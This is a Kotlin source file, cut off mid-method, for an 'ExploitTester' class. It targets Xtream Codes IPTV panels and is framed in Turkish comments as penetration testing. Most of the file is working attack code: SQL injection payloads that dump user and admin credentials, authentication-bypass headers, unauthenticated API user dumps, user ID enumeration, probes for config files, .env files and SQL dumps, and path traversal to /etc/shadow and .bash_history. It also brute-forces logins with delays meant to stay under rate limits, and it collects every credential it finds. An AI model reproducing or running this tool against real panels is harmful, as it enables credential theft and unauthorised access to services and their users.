package com.alibaba.data.service

import com.alibaba.domain.model.*
import com.alibaba.domain.service.ExploitTester
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import java.util.concurrent.atomic.AtomicInteger
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Gelişmiş Panel Güvenlik Testi (Penetration Testing)
 * 
 * Bu sınıf Xtream Codes panellerinin bilinen güvenlik açıklarını test eder:
 * 1. SQL Injection - Veritabanından kullanıcı çekme
 * 2. Authentication Bypass - Header manipülasyonu ile auth atlama
 * 3. API Endpoint Abuse - api.php ile kullanıcı listesi çekme
 * 4. User ID Enumeration - ID tarayarak hesap bulma
 * 5. Panel API Exploit - Admin API fonksiyonlarına yetkisiz erişim
 * 6. Config File Leak - Yapılandırma dosyalarını okuma
 */
@Singleton
class ExploitTesterImpl @Inject constructor() : ExploitTester {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()

    override suspend fun runExploitTest(
        config: ExploitTestConfig,
        onProgress: (ExploitTestProgress) -> Unit,
        onVulnerabilityFound: (ExploitTestResult) -> Unit
    ): List<ExploitTestResult> = withContext(Dispatchers.IO) {
        
        val results = mutableListOf<ExploitTestResult>()
        var foundVulnerabilities = 0
        var foundCredentials = 0
        
        val baseUrl = buildBaseUrl(config.panelUrl, config.panelPort)
        
        // Check if panel is reachable
        onProgress(ExploitTestProgress(
            currentTest = "Panel erişilebilirlik kontrolü",
            currentPhase = TestPhase.INITIALIZING,
            progress = 0,
            total = 100,
            foundVulnerabilities = 0,
            foundCredentials = 0
        ))
        
        if (!checkPanelReachable(config.panelUrl, config.panelPort)) {
            val result = ExploitTestResult(
                vulnerability = VulnerabilityType.INFORMATION_DISCLOSURE,
                severity = Severity.INFO,
                description = "Panel erişilemedi: $baseUrl",
                exploitMethod = "Panel URL'si veya port yanlış olabilir",
                recommendation = "Panel URL ve port bilgilerini kontrol edin"
            )
            results.add(result)
            onVulnerabilityFound(result)
            return@withContext results
        }
        
        // Calculate total tests
        var totalTests = 0
        if (config.testSqlInjection) totalTests += 15
        if (config.testAuthBypass) totalTests += 10
        if (config.testApiExploit) totalTests += 8
        if (config.testUserIdEnumeration) totalTests += (config.userIdEnd - config.userIdStart + 1)
        if (config.testPanelApiExploit) totalTests += 12
        if (config.testConfigLeak) totalTests += 20
        if (config.testPathTraversal) totalTests += 15
        if (config.testDefaultCredentials) totalTests += DefaultCredentials.credentials.size
        // Brute Force: custom wordlist + CommonUsernames × CommonPasswords
        val bruteForceEnabled = config.customWordlist.isNotEmpty() || config.testDefaultCredentials
        if (config.customWordlist.isNotEmpty()) totalTests += config.customWordlist.size
        if (config.testDefaultCredentials) totalTests += CommonUsernames.usernames.size * CommonPasswords.passwords.size
        
        var currentTest = 0
        
        // ═══════════════════════════════════════════════════════════════
        // 1. SQL INJECTION TEST - Veritabanından kullanıcı çekme
        // ═══════════════════════════════════════════════════════════════
        if (config.testSqlInjection) {
            onProgress(ExploitTestProgress(
                currentTest = "SQL Injection test ediliyor",
                currentPhase = TestPhase.TESTING_SQL_INJECTION,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            // SQL Injection payloads for Xtream Codes
            val sqlPayloads = listOf(
                // Union-based SQL injection
                "' UNION SELECT username,password,3,4,5 FROM users--" to "UNION SELECT",
                "' UNION SELECT username,password FROM users WHERE '1'='1" to "UNION SELECT users",
                "1' OR '1'='1' UNION SELECT * FROM users--" to "OR 1=1 UNION",
                
                // Error-based SQL injection
                "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--" to "Error-based (CONVERT)",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 1)))--" to "EXTRACTVALUE",
                
                // Blind SQL injection
                "' AND (SELECT COUNT(*) FROM users)>0--" to "Blind COUNT check",
                "' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--" to "Blind SUBSTRING",
                
                // Time-based blind
                "' AND SLEEP(3)--" to "Time-based SLEEP",
                "'; WAITFOR DELAY '0:0:3'--" to "Time-based WAITFOR",
                
                // Xtream Codes specific
                "admin'--" to "Comment bypass",
                "' OR username LIKE '%admin%'--" to "LIKE wildcard",
                "1; SELECT * FROM stream_sys_users--" to "stream_sys_users table",
                "1; SELECT * FROM reg_users--" to "reg_users table",
                "1; SELECT username,password FROM users WHERE is_admin=1--" to "Admin users",
                "' UNION ALL SELECT username,password,exp_date,max_connections FROM users--" to "Full user dump"
            )
            
            for ((payload, description) in sqlPayloads) {
                ensureActive()
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "SQLi: $description",
                    currentPhase = TestPhase.TESTING_SQL_INJECTION,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val sqlResult = testSqlInjection(baseUrl, payload)
                if (sqlResult != null) {
                    foundVulnerabilities++
                    
                    // Parse credentials if found
                    val creds = parseSqlInjectionResult(sqlResult, baseUrl)
                    if (creds.isNotEmpty()) {
                        foundCredentials += creds.size
                        
                        for (cred in creds) {
                            val result = ExploitTestResult(
                                vulnerability = VulnerabilityType.SQL_INJECTION,
                                severity = Severity.CRITICAL,
                                description = "SQL Injection ile kullanıcı bilgisi çekildi!",
                                exploitMethod = """
                                    |Yöntem: $description
                                    |Payload: $payload
                                    |
                                    |SQL Injection açığı bulundu. Panel veritabanına doğrudan erişim sağlandı.
                                    |Bu açık sayesinde tüm kullanıcı bilgileri (username, password, expiry) çekilebilir.
                                """.trimMargin(),
                                foundCredentials = cred,
                                recommendation = """
                                    |KRİTİK GÜVENLİK AÇIĞI!
                                    |1. Tüm SQL sorgularında prepared statements kullanın
                                    |2. Kullanıcı girdilerini sanitize edin
                                    |3. Veritabanı kullanıcısının yetkilerini kısıtlayın
                                    |4. WAF (Web Application Firewall) kurun
                                    |5. Xtream Codes'u en son sürüme güncelleyin
                                """.trimMargin()
                            )
                            results.add(result)
                            onVulnerabilityFound(result)
                        }
                    } else {
                        val result = ExploitTestResult(
                            vulnerability = VulnerabilityType.SQL_INJECTION,
                            severity = Severity.CRITICAL,
                            description = "SQL Injection açığı tespit edildi!",
                            exploitMethod = "Payload: $payload\nYanıt: ${sqlResult.take(200)}...",
                            recommendation = "SQL sorgularında prepared statements kullanın. Kullanıcı girdilerini sanitize edin."
                        )
                        results.add(result)
                        onVulnerabilityFound(result)
                    }
                }
                
                delay(150)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 2. AUTHENTICATION BYPASS TEST
        // ═══════════════════════════════════════════════════════════════
        if (config.testAuthBypass) {
            onProgress(ExploitTestProgress(
                currentTest = "Authentication Bypass test ediliyor",
                currentPhase = TestPhase.TESTING_AUTH_BYPASS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            // Auth bypass techniques based on Check Point Research
            val authBypassTests = listOf(
                Triple("/admin/", mapOf("X-Requested-With" to ""), "Ajax header bypass"),
                Triple("/admin/src/Controller/VideoClubController.php", mapOf<String, String>(), "Direct controller access"),
                Triple("/api.php?action=user&sub=list", mapOf<String, String>(), "User list API"),
                Triple("/api.php?action=server&sub=list", mapOf<String, String>(), "Server list API"),
                Triple("/panel_api.php?action=get_users", mapOf<String, String>(), "Panel API get_users"),
                Triple("/admin/api.php?action=user&sub=info", mapOf("X-Forwarded-For" to "127.0.0.1"), "IP spoof localhost"),
                Triple("/admin/index.php", mapOf("Cookie" to "admin_session=1; is_admin=1"), "Cookie injection"),
                Triple("/api.php?action=stream&sub=online", mapOf<String, String>(), "Stream list API"),
                Triple("/admin/live.php", mapOf("Referer" to "$baseUrl/admin/"), "Referer bypass"),
                Triple("/api.php?action=user&sub=create&username=test&password=test", mapOf<String, String>(), "User create API")
            )
            
            for ((endpoint, headers, description) in authBypassTests) {
                ensureActive()
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Auth Bypass: $description",
                    currentPhase = TestPhase.TESTING_AUTH_BYPASS,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val bypassResult = testAuthBypass(baseUrl, endpoint, headers)
                if (bypassResult != null) {
                    foundVulnerabilities++
                    
                    // Try to extract user data
                    val creds = parseApiResponse(bypassResult, baseUrl)
                    if (creds.isNotEmpty()) {
                        foundCredentials += creds.size
                        for (cred in creds) {
                            val result = ExploitTestResult(
                                vulnerability = VulnerabilityType.AUTH_BYPASS,
                                severity = Severity.CRITICAL,
                                description = "Authentication bypass ile kullanıcı verisi çekildi!",
                                exploitMethod = """
                                    |Yöntem: $description
                                    |Endpoint: $endpoint
                                    |Headers: $headers
                                    |
                                    |Kimlik doğrulama atlandı ve panel verilerine erişildi.
                                """.trimMargin(),
                                foundCredentials = cred,
                                recommendation = """
                                    |1. Tüm admin endpoint'lerinde authentication zorunlu olmalı
                                    |2. X-Requested-With header kontrolünü kaldırmayın
                                    |3. IP tabanlı erişim kısıtlaması ekleyin
                                    |4. Session yönetimini güçlendirin
                                """.trimMargin()
                            )
                            results.add(result)
                            onVulnerabilityFound(result)
                        }
                    } else {
                        val result = ExploitTestResult(
                            vulnerability = VulnerabilityType.AUTH_BYPASS,
                            severity = Severity.HIGH,
                            description = "Authentication bypass açığı bulundu!",
                            exploitMethod = "Endpoint: $endpoint\nYöntem: $description",
                            recommendation = "Admin endpoint'lerinde authentication kontrolünü güçlendirin."
                        )
                        results.add(result)
                        onVulnerabilityFound(result)
                    }
                }
                
                delay(150)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 3. API ENDPOINT EXPLOIT - Kullanıcı listesi çekme
        // ═══════════════════════════════════════════════════════════════
        if (config.testApiExploit) {
            onProgress(ExploitTestProgress(
                currentTest = "API Exploit test ediliyor",
                currentPhase = TestPhase.TESTING_API_EXPLOIT,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            // Xtream Codes API endpoints that may leak user data
            val apiEndpoints = listOf(
                "/api.php?action=user&sub=info" to "User info API",
                "/api.php?action=user&sub=list" to "User list API",
                "/api.php?action=user&sub=info&username=admin" to "Admin user info",
                "/panel_api.php" to "Panel API root",
                "/panel_api.php?action=get_account_info" to "Account info",
                "/api.php?action=stb&sub=list" to "STB/MAG device list",
                "/api.php?action=stream&sub=list" to "Stream list",
                "/xmltv.php" to "XMLTV EPG data"
            )
            
            for ((endpoint, description) in apiEndpoints) {
                ensureActive()
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "API: $description",
                    currentPhase = TestPhase.TESTING_API_EXPLOIT,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val apiResult = testApiEndpoint(baseUrl, endpoint)
                if (apiResult != null) {
                    val creds = parseApiResponse(apiResult, baseUrl)
                    if (creds.isNotEmpty()) {
                        foundVulnerabilities++
                        foundCredentials += creds.size
                        
                        for (cred in creds) {
                            val result = ExploitTestResult(
                                vulnerability = VulnerabilityType.API_USER_DUMP,
                                severity = Severity.CRITICAL,
                                description = "API endpoint'ten kullanıcı bilgisi sızdı!",
                                exploitMethod = """
                                    |Endpoint: $endpoint
                                    |Açıklama: $description
                                    |
                                    |Bu API endpoint'i kimlik doğrulama olmadan kullanıcı verisi döndürüyor.
                                """.trimMargin(),
                                foundCredentials = cred,
                                recommendation = """
                                    |1. Bu API endpoint'ini devre dışı bırakın veya authentication ekleyin
                                    |2. API erişimini IP whitelist ile kısıtlayın
                                    |3. Rate limiting uygulayın
                                """.trimMargin()
                            )
                            results.add(result)
                            onVulnerabilityFound(result)
                        }
                    }
                }
                
                delay(150)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 4. USER ID ENUMERATION - ID tarayarak hesap bulma
        // ═══════════════════════════════════════════════════════════════
        if (config.testUserIdEnumeration) {
            onProgress(ExploitTestProgress(
                currentTest = "User ID Enumeration başlıyor (${config.userIdStart}-${config.userIdEnd})",
                currentPhase = TestPhase.TESTING_USER_ID_ENUM,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            var enumFoundCount = 0
            
            for (userId in config.userIdStart..config.userIdEnd) {
                ensureActive()
                currentTest++
                
                if (userId % 50 == 0) {
                    onProgress(ExploitTestProgress(
                        currentTest = "User ID: $userId / ${config.userIdEnd} (Bulunan: $enumFoundCount)",
                        currentPhase = TestPhase.TESTING_USER_ID_ENUM,
                        progress = currentTest,
                        total = totalTests,
                        foundVulnerabilities = foundVulnerabilities,
                        foundCredentials = foundCredentials
                    ))
                }
                
                val userResult = testUserIdEnumeration(baseUrl, userId)
                if (userResult != null) {
                    enumFoundCount++
                    foundCredentials++
                    
                    if (enumFoundCount == 1) {
                        foundVulnerabilities++ // Count vulnerability only once
                    }
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.USER_ID_ENUMERATION,
                        severity = Severity.CRITICAL,
                        description = "User ID $userId ile kullanıcı bilgisi bulundu!",
                        exploitMethod = """
                            |Yöntem: User ID Enumeration
                            |User ID: $userId
                            |
                            |Panel, ardışık user ID'leri ile sorgulandığında kullanıcı bilgilerini döndürüyor.
                            |Bu açık ile tüm kullanıcılar taranabilir.
                        """.trimMargin(),
                        foundCredentials = userResult,
                        recommendation = """
                            |1. User ID tabanlı sorguları devre dışı bırakın
                            |2. API endpoint'lerine authentication ekleyin
                            |3. Rate limiting uygulayın
                            |4. User ID yerine UUID kullanın
                        """.trimMargin()
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(50) // Fast enumeration
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 5. PANEL API EXPLOIT - Admin fonksiyonlarına erişim
        // ═══════════════════════════════════════════════════════════════
        if (config.testPanelApiExploit) {
            onProgress(ExploitTestProgress(
                currentTest = "Panel API Exploit test ediliyor",
                currentPhase = TestPhase.TESTING_PANEL_API,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            // Panel API endpoints that may be exploitable
            val panelApiEndpoints = listOf(
                "/panel_api.php?username=&password=&action=get_account_info" to "Empty credentials",
                "/panel_api.php?action=get_live_categories" to "Live categories",
                "/panel_api.php?action=get_vod_categories" to "VOD categories",
                "/api.php?action=user&sub=info&username=' OR '1'='1" to "SQLi in username",
                "/api.php?action=user&sub=list&limit=100" to "User list with limit",
                "/api.php?action=user&sub=info&id=1" to "User by ID",
                "/admin/api.php?action=user&sub=list" to "Admin user list",
                "/admin/api.php?action=stream&sub=list" to "Admin stream list",
                "/api.php?action=mag&sub=list" to "MAG device list",
                "/api.php?action=enigma&sub=list" to "Enigma device list",
                "/api.php?action=reg_users&sub=list" to "Registered users",
                "/api.php?action=stream_sys_users&sub=list" to "System users"
            )
            
            for ((endpoint, description) in panelApiEndpoints) {
                ensureActive()
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Panel API: $description",
                    currentPhase = TestPhase.TESTING_PANEL_API,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val panelResult = testPanelApiEndpoint(baseUrl, endpoint)
                if (panelResult != null) {
                    val creds = parseApiResponse(panelResult, baseUrl)
                    if (creds.isNotEmpty()) {
                        foundVulnerabilities++
                        foundCredentials += creds.size
                        
                        for (cred in creds) {
                            val result = ExploitTestResult(
                                vulnerability = VulnerabilityType.PANEL_API_EXPLOIT,
                                severity = Severity.CRITICAL,
                                description = "Panel API exploit ile kullanıcı verisi çekildi!",
                                exploitMethod = """
                                    |Endpoint: $endpoint
                                    |Yöntem: $description
                                    |
                                    |Panel API'si yetkisiz erişime açık ve kullanıcı verisi döndürüyor.
                                """.trimMargin(),
                                foundCredentials = cred,
                                recommendation = """
                                    |1. Panel API'yi tamamen devre dışı bırakın veya güçlü authentication ekleyin
                                    |2. API key zorunluluğu getirin
                                    |3. IP whitelist uygulayın
                                """.trimMargin()
                            )
                            results.add(result)
                            onVulnerabilityFound(result)
                        }
                    }
                }
                
                delay(150)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 6. CONFIG FILE LEAK - Yapılandırma dosyalarını okuma
        // ═══════════════════════════════════════════════════════════════
        if (config.testConfigLeak) {
            onProgress(ExploitTestProgress(
                currentTest = "Config dosyaları taranıyor",
                currentPhase = TestPhase.TESTING_CONFIG_LEAK,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            val configFiles = listOf(
                "/.env" to "Environment variables",
                "/config.php" to "PHP config",
                "/includes/config.php" to "Includes config",
                "/admin/config.php" to "Admin config",
                "/application/config/database.php" to "Database config",
                "/wp-config.php" to "WordPress config",
                "/.git/config" to "Git config",
                "/.htaccess" to "Apache htaccess",
                "/web.config" to "IIS config",
                "/phpinfo.php" to "PHP info",
                "/info.php" to "Info page",
                "/test.php" to "Test page",
                "/debug.php" to "Debug page",
                "/backup.sql" to "SQL backup",
                "/database.sql" to "Database dump",
                "/users.sql" to "Users dump",
                "/dump.sql" to "SQL dump",
                "/.env.backup" to "Env backup",
                "/config.php.bak" to "Config backup",
                "/config.php~" to "Config temp"
            )
            
            for ((file, description) in configFiles) {
                ensureActive()
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Config: $file",
                    currentPhase = TestPhase.TESTING_CONFIG_LEAK,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val configResult = testConfigLeak(baseUrl, file)
                if (configResult != null) {
                    foundVulnerabilities++
                    
                    // Try to extract database credentials
                    val dbCreds = parseConfigFile(configResult, baseUrl)
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.CONFIG_LEAK,
                        severity = Severity.CRITICAL,
                        description = "Yapılandırma dosyası sızdı: $file",
                        exploitMethod = """
                            |Dosya: $file
                            |Açıklama: $description
                            |
                            |İçerik (ilk 500 karakter):
                            |${configResult.take(500)}
                        """.trimMargin(),
                        foundCredentials = dbCreds,
                        recommendation = """
                            |1. Bu dosyayı web erişimine kapatın (.htaccess veya nginx config)
                            |2. Hassas dosyaları web root dışına taşıyın
                            |3. Backup dosyalarını sunucudan silin
                            |4. .git klasörünü web erişimine kapatın
                        """.trimMargin()
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(100)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 7. PATH TRAVERSAL (Eski test - opsiyonel)
        // ═══════════════════════════════════════════════════════════════
        if (config.testPathTraversal) {
            onProgress(ExploitTestProgress(
                currentTest = "Path Traversal test ediliyor",
                currentPhase = TestPhase.TESTING_PATH_TRAVERSAL,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            val pathPayloads = listOf(
                "../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//etc/passwd",
                "../../../var/www/html/config.php",
                "../../../home/xtream-codes/config",
                "..%252f..%252f..%252fetc/passwd",
                "/etc/passwd",
                "....//....//var/www/xtream-codes/config.php",
                "../../../usr/local/xtream-codes/config",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "../../../var/log/auth.log",
                "../../../var/log/apache2/access.log",
                "../../../proc/self/environ",
                "../../../etc/shadow",
                "../../../root/.bash_history"
            )
            
            for (payload in pathPayloads) {
                ensureActive()
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Path: ${payload.take(30)}...",
                    currentPhase = TestPhase.TESTING_PATH_TRAVERSAL,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val pathResult = testPathTraversal(baseUrl, payload)
                if (pathResult) {
                    foundVulnerabilities++
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.PATH_TRAVERSAL,
                        severity = Severity.CRITICAL,
                        description = "Path Traversal açığı bulundu!",
                        exploitMethod = "Payload: $payload",
                        recommendation = "Web sunucusu yapılandırmasını kontrol edin. Path traversal filtreleri ekleyin."
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(100)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 8. DEFAULT CREDENTIALS (Eski test - opsiyonel)
        // ═══════════════════════════════════════════════════════════════
        if (config.testDefaultCredentials) {
            onProgress(ExploitTestProgress(
                currentTest = "Varsayılan kimlik bilgileri test ediliyor",
                currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            for ((username, password) in DefaultCredentials.credentials) {
                ensureActive()
                currentTest++
                
                val credential = testCredential(config.panelUrl, config.panelPort, username, password)
                if (credential != null) {
                    foundCredentials++
                    foundVulnerabilities++
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.DEFAULT_CREDENTIALS,
                        severity = Severity.CRITICAL,
                        description = "Varsayılan kimlik bilgileri ile giriş yapıldı!",
                        exploitMethod = "Kullanıcı: $username, Şifre: $password",
                        foundCredentials = credential,
                        recommendation = "Bu hesabın şifresini hemen değiştirin!"
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(100)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 9. CUSTOM WORDLIST BRUTE FORCE
        // ═══════════════════════════════════════════════════════════════
        if (config.customWordlist.isNotEmpty()) {
            onProgress(ExploitTestProgress(
                currentTest = "Özel kelime listesi ile brute force (${config.customWordlist.size} kombinasyon)",
                currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            for (entry in config.customWordlist) {
                ensureActive()
                currentTest++
                
                val parts = entry.split(":", limit = 2)
                if (parts.size == 2) {
                    val username = parts[0].trim()
                    val password = parts[1].trim()
                    
                    onProgress(ExploitTestProgress(
                        currentTest = "Brute Force: $username:****",
                        currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                        progress = currentTest,
                        total = totalTests,
                        foundVulnerabilities = foundVulnerabilities,
                        foundCredentials = foundCredentials
                    ))
                    
                    val credential = testCredential(config.panelUrl, config.panelPort, username, password)
                    if (credential != null) {
                        foundCredentials++
                        foundVulnerabilities++
                        
                        val result = ExploitTestResult(
                            vulnerability = VulnerabilityType.WEAK_PASSWORD,
                            severity = Severity.CRITICAL,
                            description = "Özel kelime listesinden hesap bulundu!",
                            exploitMethod = "Kullanıcı: $username, Şifre: $password",
                            foundCredentials = credential,
                            recommendation = "Bu hesabın şifresini hemen güçlü bir şifre ile değiştirin!"
                        )
                        results.add(result)
                        onVulnerabilityFound(result)
                    }
                }
                
                delay(80)
            }
        }
        
        // ═══════════════════════════════════════════════════════════════
        // 10. FULL BRUTE FORCE - CommonUsernames × CommonPasswords
        // Tüm yaygın user/pass kombinasyonlarını dene
        // ═══════════════════════════════════════════════════════════════
        if (config.testDefaultCredentials) {
            val totalBrute = CommonUsernames.usernames.size * CommonPasswords.passwords.size
            var bruteCount = 0
            var bruteFound = 0
            
            onProgress(ExploitTestProgress(
                currentTest = "Full Brute Force başlıyor ($totalBrute kombinasyon)",
                currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            // Rate limit tespiti
            var consecutiveFailures = 0
            var rateLimited = false
            
            for (username in CommonUsernames.usernames) {
                if (rateLimited) break
                
                for (password in CommonPasswords.passwords) {
                    ensureActive()
                    currentTest++
                    bruteCount++
                    
                    if (bruteCount % 20 == 0) {
                        onProgress(ExploitTestProgress(
                            currentTest = "Brute Force: $bruteCount/$totalBrute ($bruteFound bulundu) - $username:****",
                            currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                            progress = currentTest,
                            total = totalTests,
                            foundVulnerabilities = foundVulnerabilities,
                            foundCredentials = foundCredentials
                        ))
                    }
                    
                    val credential = testCredential(config.panelUrl, config.panelPort, username, password)
                    if (credential != null) {
                        bruteFound++
                        foundCredentials++
                        foundVulnerabilities++
                        consecutiveFailures = 0
                        
                        val result = ExploitTestResult(
                            vulnerability = VulnerabilityType.WEAK_PASSWORD,
                            severity = Severity.CRITICAL,
                            description = "Brute Force ile hesap bulundu!",
                            exploitMethod = """
                                |Kullanıcı: $username
                                |Şifre: $password
                                |Deneme: $bruteCount / $totalBrute
                                |
                                |Panel brute force korumasız! Zayıf şifre ile hesap bulundu.
                            """.trimMargin(),
                            foundCredentials = credential,
                            recommendation = """
                                |KRİTİK:
                                |1. Bu hesabın şifresini hemen değiştirin
                                |2. Brute force koruması (rate limiting) ekleyin
                                |3. Captcha veya IP ban sistemi kurun
                                |4. Tüm hesaplarda güçlü şifre zorunluluğu getirin
                            """.trimMargin()
                        )
                        results.add(result)
                        onVulnerabilityFound(result)
                    } else {
                        consecutiveFailures++
                        // Rate limit tespiti: 50 ardışık başarısızlık + response çok hızlı = muhtemelen bloklandık
                        if (consecutiveFailures > 100) {
                            // Panel hala erişilebilir mi kontrol et
                            val reachable = checkPanelReachable(config.panelUrl, config.panelPort)
                            if (!reachable) {
                                rateLimited = true
                                val result = ExploitTestResult(
                                    vulnerability = VulnerabilityType.NO_RATE_LIMIT,
                                    severity = Severity.INFO,
                                    description = "Panel erişilemez hale geldi - muhtemelen IP ban uygulandı",
                                    exploitMethod = "$bruteCount deneme sonrası panel yanıt vermiyor",
                                    recommendation = "Panel rate limiting koruması çalışıyor gibi görünüyor (iyi!)"
                                )
                                results.add(result)
                                onVulnerabilityFound(result)
                                break
                            }
                            consecutiveFailures = 0
                        }
                    }
                    
                    delay(60) // Rate limit'e takılmamak için
                }
            }
            
            // Brute force sonucu - koruma var mı?
            if (!rateLimited && bruteFound == 0 && bruteCount > 50) {
                val result = ExploitTestResult(
                    vulnerability = VulnerabilityType.NO_RATE_LIMIT,
                    severity = Severity.MEDIUM,
                    description = "Panel $bruteCount brute force denemesine izin verdi",
                    exploitMethod = "$bruteCount farklı kullanıcı:şifre kombinasyonu denendi, panel hiçbirini engellemedi",
                    recommendation = """
                        |Panel brute force korumasız!
                        |1. Rate limiting ekleyin (örn: 10 başarısız deneme sonrası 5 dk ban)
                        |2. Captcha ekleyin
                        |3. IP bazlı erişim kısıtlaması uygulayın
                        |4. fail2ban gibi araçlar kullanın
                    """.trimMargin()
                )
                results.add(result)
                onVulnerabilityFound(result)
            }
        }
        
        // Final progress
        onProgress(ExploitTestProgress(
            currentTest = "Test tamamlandı - $foundVulnerabilities açık, $foundCredentials hesap bulundu",
            currentPhase = TestPhase.COMPLETED,
            progress = totalTests,
            total = totalTests,
            foundVulnerabilities = foundVulnerabilities,
            foundCredentials = foundCredentials
        ))
        
        results
    }
    
    // ═══════════════════════════════════════════════════════════════
    // EXPLOIT HELPER METHODS
    // ═══════════════════════════════════════════════════════════════
    
    private fun testSqlInjection(baseUrl: String, payload: String): String? {
        return try {
            // Test SQL injection in various parameters
            val endpoints = listOf(
                "$baseUrl/player_api.php?username=$payload&password=test",
                "$baseUrl/api.php?action=user&sub=info&username=$payload",
                "$baseUrl/get.php?username=$payload&password=test&type=m3u",
                "$baseUrl/panel_api.php?username=$payload&password=test"
            )
            
            for (endpoint in endpoints) {
                val encodedUrl = endpoint.replace(" ", "%20")
                val request = Request.Builder()
                    .url(encodedUrl)
                    .get()
                    .addHeader("User-Agent", "Mozilla/5.0")
                    .build()
                
                val response = client.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()
                
                // Check for SQL injection indicators
                if (body.contains("username", ignoreCase = true) && 
                    body.contains("password", ignoreCase = true) &&
                    (body.contains("exp_date", ignoreCase = true) || 
                     body.contains("max_connections", ignoreCase = true) ||
                     body.contains("\"auth\"", ignoreCase = true))) {
                    return body
                }
                
                // Check for SQL error messages (indicates vulnerability)
                if (body.contains("SQL syntax", ignoreCase = true) ||
                    body.contains("mysql_fetch", ignoreCase = true) ||
                    body.contains("ORA-", ignoreCase = true) ||
                    body.contains("PostgreSQL", ignoreCase = true) ||
                    body.contains("SQLite", ignoreCase = true)) {
                    return body
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testAuthBypass(baseUrl: String, endpoint: String, headers: Map<String, String>): String? {
        return try {
            val requestBuilder = Request.Builder()
                .url("$baseUrl$endpoint")
                .get()
                .addHeader("User-Agent", "Mozilla/5.0")
            
            // Add custom headers for bypass
            for ((key, value) in headers) {
                if (value.isEmpty()) {
                    // Don't add header (to test missing header bypass)
                } else {
                    requestBuilder.addHeader(key, value)
                }
            }
            
            val response = client.newCall(requestBuilder.build()).execute()
            val body = response.body?.string() ?: ""
            val code = response.code
            response.close()
            
            // Check if we got meaningful data without authentication
            if (code in 200..299 && body.length > 100) {
